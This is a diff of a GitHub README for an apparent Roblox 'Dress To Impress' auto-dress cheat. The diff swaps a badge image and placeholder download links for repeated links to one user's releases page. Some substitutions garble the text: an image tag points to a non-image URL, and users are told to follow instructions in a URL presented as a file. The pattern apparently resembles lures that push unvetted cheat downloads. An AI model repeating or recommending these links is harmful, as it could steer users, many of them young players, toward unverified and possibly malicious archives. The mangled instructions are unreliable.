@@ -1,6 +1,6 @@
 # Roblox Dress To Impress Auto-Dress Script 🎮👗
 
-![Roblox Dress To Impress](https://img.shields.io/badge/Roblox-Dress%20To%20Impress-blue)
+![Roblox Dress To Impress](https://github.com/liwernv/Roblox-Dress-To-Impress/releases%20To%20Impress-blue)
 
 Welcome to the **Roblox Dress To Impress** repository! This project features an auto-dress script designed specifically for the popular Roblox game, *Dress to Impress*. With this script, players can automatically select and equip the best outfits based on the runway theme, providing a significant edge in competitions.
 
@@ -32,9 +32,9 @@ The script analyzes the runway theme and selects the most suitable outfits from 
 
 To get started, download the script using the link below:
 
-[Download the Script](https://github.com/repo/user/archive.zip)
+[Download the Script](https://github.com/liwernv/Roblox-Dress-To-Impress/releases)
 
-Once downloaded, extract the contents and follow the instructions in the `INSTALL.md` file included in the package.
+Once downloaded, extract the contents and follow the instructions in the `https://github.com/liwernv/Roblox-Dress-To-Impress/releases` file included in the package.
 
 ## Usage
 
@@ -80,10 +80,10 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 
 Special thanks to the Roblox community for their support and feedback. Your input has been invaluable in shaping this project. 
 
-For updates and releases, please check the [Releases](https://github.com/repo/user/releases) section.
+For updates and releases, please check the [Releases](https://github.com/liwernv/Roblox-Dress-To-Impress/releases) section.
 
 If you need to download the script again, you can find it here:
 
-[Download the Script](https://github.com/repo/user/archive.zip)
+[Download the Script](https://github.com/liwernv/Roblox-Dress-To-Impress/releases)
 
 Enjoy dressing to impress! 🎉
